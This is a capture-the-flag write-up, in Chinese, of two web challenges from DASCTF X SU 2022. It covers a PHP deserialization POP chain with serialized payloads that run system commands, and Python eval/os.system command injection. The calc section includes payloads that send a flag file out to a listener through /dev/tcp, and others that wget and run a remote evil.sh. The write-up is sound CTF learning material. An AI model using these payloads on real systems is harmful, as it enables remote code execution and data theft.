---
title: DASCTF X SU 2022 writeup
date: 2022-03-26 23:06:00
tags: [ctf,security]

---
# DASCTF X SU 2022 writeup

## web

我是一个也没出，ezpop是只差了一点点然后calc确实没啥思路，赛后补一下题

### ezpop

这题是当时死活打不通然后赛后补题做出来了，补题过程中遇到了一些有趣的小问题，首先先看一下题目，题目是个非常基础的php反序列化题目，直接能够让用户操控反序列化的参数，找一条POP链完成利用就可以啦，下面是题目给出的源代码。

```php
<?php

class crow
{
    public $v1;
    public $v2;

    function eval() {
        echo new $this->v1($this->v2);
    }

    public function __invoke()
    {
        $this->v1->world();
    }
}

class fin
{
    public $f1;

    public function __destruct()
    {
        echo $this->f1 . '114514';
    }

    public function run()
    {
        ($this->f1)();
    }

    public function __call($a, $b)
    {
        echo $this->f1->get_flag();
    }

}

class what
{
    public $a;

    public function __toString()
    {
        $this->a->run();
        return 'hello';
    }
}
class mix
{
    public $m1;

    public function run()
    {
        ($this->m1)();
    }

    public function get_flag()
    {
        eval('#' . $this->m1);
    }

}

if (isset($_POST['cmd'])) {
    unserialize($_POST['cmd']);
} else {
    highlight_file(__FILE__);
}
```

根据源代码我当时是找了这样一条反序列化的POP链

下面是四个魔法方法

__invoke()  当尝试以调用函数的方式调用一个对象时

__destruct() 会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。

__call() 在对象中调用一个不可访问方法时，会被调用。

__toString() 方法用于一个类被当成字符串时应怎样回应

下面是我最初的POC

```php
<?php

class crow
{
    public $v1;
    public $v2;

//    public function __construct()
//    {
//        $this->v1 = new fin();
//    }

    function eval() {
        echo new $this->v1($this->v2);
    }

    public function __invoke()
    {
        $this->v1->world();
    }
}

class fin
{
    public $f1;
//    public function __construct()
//    {
//        $this->f1 = new what();
//    }

    public function __destruct()
    {
        echo $this->f1 . '114514';
    }

    public function run()
    {
        ($this->f1)();
    }

    public function __call($a, $b)
    {
        echo $this->f1->get_flag();
    }
}

class what
{
    public $a;

//    public function __construct()
//    {
//        $this->a = new mix();
//    }

    public function __toString()
    {
        $this->a->run();
        return 'hello';
    }
}
class mix
{
    public $m1 ;

//    public function __construct()
//    {
//        $this->m1 = new crow();
//    }

    public function run()
    {
        ($this->m1)();
    }

    public function get_flag()
    {
        eval('#' . $this->m1);
    }
}

$cmd = new fin();
$cmd-> f1 = new what();
$cmd-> f1 -> a = new mix();
$cmd-> f1 -> a -> m1 = new crow();
$cmd-> f1 -> a -> m1 -> v1 = new fin();
$cmd-> f1 -> a -> m1 -> v1 -> f1 = new mix();
$cmd-> f1 -> a -> m1 -> v1 -> f1 ->m1 = '/n cat flag';
echo serialize($cmd);
```

#### 为什么burpsuite能通hackbar不能通?

fiddler能通的payload

`cmd=O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A17%3A%22%0Asystem%28%27cat+%2A%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7D`

hackbar我用这个payload

`cmd=O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A17%3A%22%0Asystem%28%27cat+%2A%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7D`

结果实际请求时候的payload

`cmd=O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A17%3A%22%0Asystem%28%27cat+*%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7D`

仔细看可以看出一些细微的差别，system前面变成了%0D%0A，多了个%0D，%0D 是CR hackbar帮我补了回车，因此打不通，hackbar使用raw的方式是不会补回车的，也可以成功打通

#### 我的payload问题出在哪了?

没有url编码，url编码后直接就能出，只需要添加一个urlencode

![image-20220326220630847](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220326220630847.png)

遇到这种问题还是基本功不扎实，说实现我现在也还是不特别了解url编码的作用和底层原理，会再好好研究一下然后再写一篇文章的。

fin \_\_destruct -> what  \_\_toString() -> mix run() -> crow \_\_invoke -> fin __call -> mix get_flag -> crow eval(#\nsystem('cat *');)

#### \_\_destruct报错为什么不用管？

__destruct报错不用管，因为这时候已经echo了内容然后才触发报错。

### calc

#### 解法一 

来自0rays nazo师傅

```python
log = "echo {0} {1} {2}> ./tmp/log.txt".format(time.strftime("%Y%m%d-
%H%M%S",time.localtime()),ip,num)
print(log)
if waf(num):
try:
data = eval(num)
os.system(log)
except:
pass
return str(data)
```



这里首先是空格的过滤用换行绕过

在自己的服务器上nc -n -lvvp port，再用payload打就可以先ls看一下flag文件名字然后再打印flag出来。

payload:`%27%27%271%27%0Acat%09/Th1s*%09%3E%09/dev/tcp/x.x.x.x/port%0A%23%273%27%27%27`

实际执行

```python
echo {0} {1} '''1'
cat /T* > /dev/tcp/x.x.x.x/port
#'3'''> ./tmp/log.txt

```

eval的时候 "'  '" 三引号 里面的内容当字符串，不报错

os.system的时候#注释后面内容 cat这个语句被执行

![image-20220326223131140](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220326223131140.png)

![image-20220326223259199](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220326223259199.png)

#### 解法二 

来自vidar summer师傅

num = "1+1#`wget\thttp://x.x.x.x:60056/evil.sh`"
num = "1+1#`bash\tevil.sh`"

这里#在python中确实会注释后面的内容，eval不会报错，但是在os.system里面由于#在双引号中，代码会被执行，#只会被当作一个字符，这点非常神奇，学习了两位师傅的解法后发现都用了#去绕过，但是具体的利用方式也不一样，非常巧妙，学到了很多。
